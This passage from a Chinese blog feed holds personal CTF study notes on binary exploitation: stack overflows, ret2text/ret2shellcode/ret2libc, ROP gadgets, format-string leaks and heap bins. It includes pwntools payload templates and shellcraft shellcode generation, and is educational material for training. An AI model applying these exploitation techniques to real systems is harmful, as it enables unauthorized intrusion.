class="hljs-string">&quot;2023.2&quot;</span><br>VERSION=<span class="hljs-string">&quot;2023.2&quot;</span><br>VERSION_CODENAME=kali-rolling<br>ID=kali<br>ID_LIKE=debian<br>HOME_URL=<span class="hljs-string">&quot;https://www.kali.org/&quot;</span><br>SUPPORT_URL=<span class="hljs-string">&quot;https://forums.kali.org/&quot;</span><br>BUG_REPORT_URL=<span class="hljs-string">&quot;https://bugs.kali.org/&quot;</span><br>ANSI_COLOR=<span class="hljs-string">&quot;1;31&quot;</span><br><br>┌──(root㉿kali)-[~/pwndbg]<br>└─<span class="hljs-comment"># python --version</span><br>Python 3.11.4<br><br><br></code></pre></td></tr></table></figure><p>kali安装之后的效果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/pwndbg]<br>└─<span class="hljs-comment"># gdb</span><br>GNU gdb (Debian 13.2-1) 13.2<br>Copyright (C) 2023 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br>This is free software: you are free to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.<br>Type <span class="hljs-string">&quot;show copying&quot;</span> and <span class="hljs-string">&quot;show warranty&quot;</span> <span class="hljs-keyword">for</span> details.<br>This GDB was configured as <span class="hljs-string">&quot;x86_64-linux-gnu&quot;</span>.<br>Type <span class="hljs-string">&quot;show configuration&quot;</span> <span class="hljs-keyword">for</span> configuration details.<br>For bug reporting instructions, please see:<br>&lt;https://www.gnu.org/software/gdb/bugs/&gt;.<br>Find the GDB manual and other documentation resources online at:<br>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br><br>For <span class="hljs-built_in">help</span>, <span class="hljs-built_in">type</span> <span class="hljs-string">&quot;help&quot;</span>.<br>Type <span class="hljs-string">&quot;apropos word&quot;</span> to search <span class="hljs-keyword">for</span> commands related to <span class="hljs-string">&quot;word&quot;</span>.<br>pwndbg: loaded 147 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] <span class="hljs-keyword">for</span> a list.<br>pwndbg: created <span class="hljs-variable">$rebase</span>, <span class="hljs-variable">$ida</span> GDB <span class="hljs-built_in">functions</span> (can be used with <span class="hljs-built_in">print</span>/break)<br>------- tip of the day (<span class="hljs-built_in">disable</span> with <span class="hljs-built_in">set</span> show-tips off) -------<br>The <span class="hljs-built_in">set</span> show-flags on setting will display CPU flags register <span class="hljs-keyword">in</span> the regs context panel<br>pwndbg&gt;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【ctf系列】pwn学习</title>
    <link href="/2023/08/14/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/08/14/ctf/unsupported/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></p><p>b站视频教程：<a href="https://www.bilibili.com/video/BV1mb411R7LR/?p=92&spm_id_from=pageDriver&vd_source=504b7dbe5398664dd37d144b1bdfc0a1">【CTF系列教程100集】2023年我在B站学CTF，国内顶级战队大佬带你从入门到精通，零基础小白必看！！！</a></p><h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc ip port<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814203631.png" alt="image.png"></p><p>攻击脚本按照一定的方式发送一个payload</p><p>磁盘中的才叫ELF<br>file a.out是一个ELF文件</p><p>节视图 划分功能<br>段视图 划分执行权限的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814210726.png" alt="image.png"></p><p>rodata   read only data<br>cat &#x2F;proc&#x2F;pid&#x2F;maps    proc表示process</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814211056.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814211232.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814211647.png" alt="image.png"></p><p>gdb调的是虚拟内存</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814212047.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814214700.png" alt="image.png"><br>BSS：未初始化的全局变量  不需要占用磁盘空间 需要占据内存空间</p><p>pwn的实战中大段序一般不多</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230814220115.png" alt="image.png"></p><p>eax：e表示extra    </p><p>LSB小端序</p><p>fork 另起了一个新的进程  </p><p>取值-译码-执行</p><p>偏移和位移 </p><p>汇编  DEST &lt;- DEST SRC ？</p><p>checksec xxx</p><p>gdb xxx<br>vmmap</p><h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><p>mov ebp esp<br>mov esp ebp<br>把esp的值给ebp</p><p>eax保存返回地址</p><p>call指令自带填入返回地址</p><p>ret 指令 ？</p><p>pwntools  python的一个模块<br>gdb中的插件：peda gef pwndbg<br>checksec a.out 命令行工具</p><p>IDA软件：</p><p>LibcSearcher</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>io=process(<span class="hljs-string">&quot;./xxx&quot;</span>)<br>io=remote(<span class="hljs-string">&quot;ip地址&quot;</span>， 端口)<br><br>io.recvline()<br>io.recv()<br><br>io.send(p64())<br>io.send(p32(<span class="hljs-number">0</span>))<br>io.send(<span class="hljs-string">b&quot;\x0a&quot;</span>) <span class="hljs-comment"># byte对象</span><br>io.sendline(<span class="hljs-string">b&quot;abcd&quot;</span>)   &lt;=&gt; io.send(<span class="hljs-string">b&quot;abcd\n&quot;</span>) <br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">16</span> + <span class="hljs-string">b&#x27;BBBB&#x27;</span> + p32(-x8048522)<br>io.sendline(payload) <br>io.interactive()<br></code></pre></td></tr></table></figure><p>ret2text 返回到test段</p><p>checksec执行结果：<br>NX：栈可执行</p><p>setbuf(stdin,0) 关闭缓冲区，可以将输入的字符串直接打印出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; b *0x8048<br>pwndbg&gt; b main<br>pwndbg&gt; r <span class="hljs-comment"># run</span><br>pwndbg&gt; s <span class="hljs-comment"># stag in?</span><br>pwndbg&gt; n<br>AAAAA<br>pwndbg&gt; stack 24<br>pwndbg&gt; vmmap<br>pwndbg&gt; <br>pwndbg&gt; <br><br></code></pre></td></tr></table></figure><p>栈的保护机制：<br>ASLR 地址随机化<br>NX<br>canary</p><p>获取shellcode的方法：<br>1）pwn有模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>shellcraft.sh() <span class="hljs-comment"># 32位机器</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(shellcraft.sh())   <span class="hljs-comment"># 输出汇编</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(asm(shellcraft.sh())) <span class="hljs-comment"># 转成二进制</span><br><br><span class="hljs-comment">########################################  64位</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>shellcraft.amd64.sh() <span class="hljs-comment"># 64位机器</span><br></code></pre></td></tr></table></figure><p>leave   表示把esp移到ebp的位置<br>pop<br>ret ???????&#x2F;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0x1111111</span> - <span class="hljs-number">0x000123</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">hex</span>(xxxx)<br><br>ljust 从左向右有调整，不够位数的用字符补齐<br>asm(shellcraft.sh()).ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + P32(0xxxxxxxxx)<br></code></pre></td></tr></table></figure><h2 id="day3"><a href="#day3" class="headerlink" title="day3"></a>day3</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-number">0xd0</span>-<span class="hljs-number">0x20</span><br></code></pre></td></tr></table></figure><p>ROP   是因为没有一个现成的函数可供调用，所以需要自己构造</p><p>ida   在汇编那个区域 输入G，然后输入地址，直接就能跳转<br>ida shift+F12 跳到字符串</p><p>ret等效于 pop EIP<br>xor %eax, %eax 将eax清空<br>mov %eax, (%edx)   加%是后者给前者赋值</p><h3 id="静态链接和动态链接"><a href="#静态链接和动态链接" class="headerlink" title="静态链接和动态链接"></a>静态链接和动态链接</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817134717.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -fno-pie -o xx test.c<br>gcc -fno-pie --static -o xx test.c<br><br>gcc -fno-pie  -g -m32 -o xx test.c<br><span class="hljs-comment"># fno-pie 关闭32</span><br><span class="hljs-comment"># -g 加上源代码</span><br><span class="hljs-comment"># -m32 编译成32位</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817133627.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817133659.png" alt="image.png"></p><p>静态链接文件较大   静态文件和动态文件大小差距在于库函数</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817135253.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; plt<br>pwndbg&gt; x 0x401030<br>pwndbg&gt; x/20 0x401030<br></code></pre></td></tr></table></figure><h2 id="day4"><a href="#day4" class="headerlink" title="day4"></a>day4</h2><p>plt在代码段<br>got     global offset table</p><p>ret2text   找后门函数<br>ret2shellcode<br>ret2syscall二进制用的是静态链接   静态 将库函数写到了elf文件本身  代码会比较多 就可以很容易的构成一个攻击流<br>ret2libc plt表中存在system，很有利</p><p>plt是一个表，表里面保存的是代码<br>got.plt里面保存的是数据，里面保存的是地址</p><p>假设<br>0xaaaaaaaa      system@got</p><p>32是栈传递 64是寄存器调用</p><p>system(“&#x2F;bin&#x2F;sh”)   &#x2F;bin&#x2F;sh是存放到rodata地方</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817211753.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817212348.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817212234.png" alt="image.png"></p><p>-fno-stack</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">关闭保护 canary fno-stack-protector ？？？<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817212726.png" alt="image.png"></p><p>nop使得ASLR打开之后栈溢出执行成为可能</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817214704.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817214722.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817215102.png" alt="image.png"><br>上图的ebp是system函数自己push进去的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817221409.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817221553.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817222300.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817222329.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817222944.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817222441.png" alt="image.png"></p><p>下面为：只有system函数，没有&#x2F;bin&#x2F;sh字符串</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817230223.png" alt="image.png"></p><h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><p>除了给可执行文件，还给了libc.so</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817231857.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230817232013.png" alt="image.png"><br>fflush()清理缓冲区<br>read(0, &amp;buf, 0xAu)   0表示标准输入</p><h2 id="day5"><a href="#day5" class="headerlink" title="day5"></a>day5</h2><p>ret2text  代码中没有后门函数<br>ret2shellcode  checksec看没有RWE相关的东西<br>ret2libc1 既有system，又有 &#x2F;bin&#x2F;sh<br>ret2libc2 只有system   自己输入&#x2F;bin&#x2F;sh<br>ret2libc3  还给了一个libc.so文件</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818223114.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818223647.png" alt="image.png"></p><p>泄露got表中put函数的地址，从libc中找到puts函数和system函数的距离，就可以算出system函数的地址了</p><p>泄露got表中put函数的地址方法：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818224227.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818224333.png" alt="image.png"></p><p>打印了好多东西，这些东西是put函数执行的，所以put函数已经执行过了，got表里面就有值了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818224614.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818225432.png" alt="image.png"></p><p>ida中找不到&#x2F;bin&#x2F;sh和sh，可以用strings找个含有sh的字符串</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818230016.png" alt="image.png"></p><p>整体的攻击脚本：<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818230201.png" alt="image.png"></p><p>sendlineafter  当收到第一个参数之后，就发送第二个参数+&#x2F;n输出</p><p>cyclic是用来填充垃圾数据的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818231237.png" alt="image.png"></p><h3 id="课后题1：ret2text"><a href="#课后题1：ret2text" class="headerlink" title="课后题1：ret2text"></a>课后题1：ret2text</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818232343.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818232502.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818232528.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818232553.png" alt="image.png"></p><h3 id="课后题2：ret2shellcode"><a href="#课后题2：ret2shellcode" class="headerlink" title="课后题2：ret2shellcode"></a>课后题2：ret2shellcode</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233129.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233201.png" alt="image.png"><br>ASLR，不知道写到栈上的地址是什么？所以题目就告诉了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233457.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233544.png" alt="image.png"></p><p>nop</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233733.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233756.png" alt="image.png"></p><p>asm是把汇编代码变成机器码</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818233930.png" alt="image.png"></p><h3 id="课后题3：ret2libc-system有-x2F-bin-x2F-sh也有"><a href="#课后题3：ret2libc-system有-x2F-bin-x2F-sh也有" class="headerlink" title="课后题3：ret2libc  system有 &#x2F;bin&#x2F;sh也有"></a>课后题3：ret2libc  system有 &#x2F;bin&#x2F;sh也有</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234215.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234115.png" alt="image.png"></p><p>有了system，在plt表里面有个表项目</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234143.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234227.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234418.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234442.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234646.png" alt="image.png"></p><p>daedbeef是垃圾数据</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818234757.png" alt="image.png"></p><h3 id="课后题4：x64"><a href="#课后题4：x64" class="headerlink" title="课后题4：x64"></a>课后题4：x64</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818235157.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230818235814.png" alt="image.png"></p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> 文件名 <span class="hljs-built_in">--only</span> <span class="hljs-string">&quot;pop|ret&quot;</span> | <span class="hljs-string">grep</span> <span class="hljs-string">rsi</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819000233.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819000402.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819000714.png" alt="image.png"></p><p>return 将栈顶的值指向rip    </p><p>rip：pop_rdi_ret</p><p>rdi： &#x2F;bin&#x2F;sh<br>rip: system</p><p>system取rdi中的参数，执行system(“&#x2F;bin&#x2F;sh”)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819001126.png" alt="image.png"><br>都是先传参，再调用函数</p><h3 id="64位ROP小技巧-csu-不是一个完整的攻击，只是ROP中间的一个技巧"><a href="#64位ROP小技巧-csu-不是一个完整的攻击，只是ROP中间的一个技巧" class="headerlink" title="64位ROP小技巧 csu(不是一个完整的攻击，只是ROP中间的一个技巧)"></a>64位ROP小技巧 csu(不是一个完整的攻击，只是ROP中间的一个技巧)</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819004149.png" alt="image.png"></p><p>jz z是1就jump z是0就向下执行</p><h3 id="课后题5："><a href="#课后题5：" class="headerlink" title="课后题5："></a>课后题5：</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002213.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002310.png" alt="image.png"></p><p>没有system<br>1）找到libc的真实地址  之前那个题是题目给提供了一个函数，然后给打印出来了</p><p>没有&#x2F;bin&#x2F;sh<br>1）有没有其他符号末尾有sh，可以调用<br>2）用rop将&#x2F;bin&#x2F;sh读入缓冲区，而且地址是固定的，例如bss<br>3）泄露了libc的地址，可以用libc里面的任何东西</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002528.png" alt="image.png"></p><p>有sh，不一定是可用的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002621.png" alt="image.png"></p><p>libc里面有&#x2F;bin&#x2F;sh，可以用的<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819002755.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819003118.png" alt="image.png"></p><p>但是有write函数</p><h2 id="day6"><a href="#day6" class="headerlink" title="day6"></a>day6</h2><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>字符串截断</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">hello world\x00password<br>hello world\x41password<br><br><span class="hljs-function"><span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-string">&quot;%p&quot;</span>, <span class="hljs-string">&quot;Hello world&quot;</span>)</span></span><br></code></pre></td></tr></table></figure><p>通过%p泄露出canary，构造exp的时候再填回去</p><p>%p是把栈上的值直接打印出来<br>%s是把栈上的值当成一个地址，把这个地址指向的内容打印出来</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819220435.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819220558.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819221142.png" alt="image.png"></p><p>取第3个参数</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819221419.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819222301.png" alt="image.png"></p><p>%n 任意地址写</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819225155.png" alt="image.png"></p><p>%hhn 一个字节<br>%hn  两个字节<br>%n     四个字节</p><h3 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819225818.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819230100.png" alt="image.png"></p><h3 id="练习题2"><a href="#练习题2" class="headerlink" title="练习题2"></a>练习题2</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819231108.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819231119.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819231422.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819232013.png" alt="image.png"></p><p>64位 前6位参数存到了寄存器中</p><h3 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h3><p>mmap  memory map</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819234617.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230819235616.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230820000051.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230820000118.png" alt="image.png"></p><h2 id="day1-1"><a href="#day1-1" class="headerlink" title="day1"></a>day1</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821210735.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821214659.png" alt="image.png"></p><p>0x8 0x10 0x18 0x20</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821213742.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821214010.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">p ptr<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821214444.png" alt="image.png"></p><p>previous size复用<br>因为previous size表示上一个chunk是free chunk的size大小，此时上一个chunk不是free chunk，所以这个previous size就没用了</p><p>fashbin中的size，即使free掉，最后一位也还是1</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821215503.png" alt="image.png"></p><p>物理链表：看上一个chunk是不是空闲，然后合并<br>逻辑链表：如下图</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821220136.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821220442.png" alt="image.png"></p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><p>只有fastbin和？是单向的，其他的bin都是双向的</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821221907.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821222905.png" alt="image.png"><br>how2heap</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230821231355.png" alt="image.png"></p><p>gdb6433</p><h1 id="day2-1"><a href="#day2-1" class="headerlink" title="day2"></a>day2</h1><p>unsorted bin绝大多数是为了fastbin创造条件的<br>unsorted bin 双向链表<br>house of xxx 一般是多个漏洞的结合</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822205923.png" alt="image.png"></p><p>fsb  - format string bug 格式化字符串漏洞</p><h3 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h3><p>最简单、最模板化的堆题目</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822214000.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822214131.png" alt="image.png"></p><p>去除了符号表</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822215801.png" alt="image.png"></p><p>fastbin 后进先出</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822221103.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822221922.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822223454.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822223118.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/f2def47484f422d3854051967a63483.png" alt="f2def47484f422d3854051967a63483.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822222816.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230822222459.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【awd】工具及方法记录</title>
    <link href="/2023/08/13/ctf/unsupported/%E3%80%90awd%E3%80%91%E5%B7%A5%E5%85%B7%E5%8F%8A%E6%96%B9%E6%B3%95%E8%AE%B0%E5%BD%95/"/>
